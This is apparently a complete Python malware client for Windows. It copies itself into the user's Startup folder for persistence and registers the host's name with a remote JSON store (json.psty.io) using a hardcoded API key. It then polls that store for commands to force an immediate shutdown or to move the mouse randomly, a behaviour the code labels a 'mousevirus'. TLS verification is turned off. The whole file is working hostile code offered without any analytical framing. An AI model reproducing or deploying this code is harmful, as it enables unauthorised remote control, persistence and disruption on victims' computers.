import requests
import json
import socket
import urllib.parse as urlparse
import os
import sys
import mouse
import screeninfo
import random
import shutil

if getattr(sys, "frozen", False):
    shutil.move(os.path.join(os.path.dirname(sys.executable), sys.executable.split("\\")[-1]), os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", sys.executable.split("\\")[-1]))
elif __file__:
    shutil.move(os.path.join(os.path.dirname(__file__), __file__.split("\\")[-1]), os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", __file__.split("\\")[-1]))
width = screeninfo.get_monitors()[0].width
height = screeninfo.get_monitors()[0].height
host = socket.gethostname()
getheaders = {
    "Api-Key": "47229801-f65c-4ae1-a65a-b5abfb723ac2",
}
putheaders = {
    "Api-Key": "47229801-f65c-4ae1-a65a-b5abfb723ac2",
    "Content-Type": "application/json"
}
store_name = "Remote"


def get():
    global getheaders
    global store_name
    try:
        getjson = requests.get("https://json.psty.io/api_v1/stores/{}".format(urlparse.quote_plus(store_name)), headers=getheaders, verify=False)
    except Exception as e:
        return [0, e]
    if getjson.status_code != 200:
        return getjson.status_code
    else:
        return getjson.text


while True:
    res = get()
    if type(res) == str:
        res = json.loads(res)
        resdata = res["data"]
        putdata = resdata
        # putdata.pop("computers")
        rescomps = resdata["computers"]
        if not host in rescomps:
            rescomps[host] = {"shutdown": 0, "mousevirus": 0}
            putdata["computers"] = rescomps
            putjson = requests.put("https://json.psty.io/api_v1/stores/{}".format(urlparse.quote_plus(store_name)), headers=putheaders, json=putdata, verify=False)
        if rescomps[host]["shutdown"] == 1:
            os.system("shutdown /s /f /t 0")
        if rescomps[host]["mousevirus"] == 1:
            for movement in range(50):
                mouse.move(random.randint(0, width), random.randint(0, height))
    else:
        print(res)
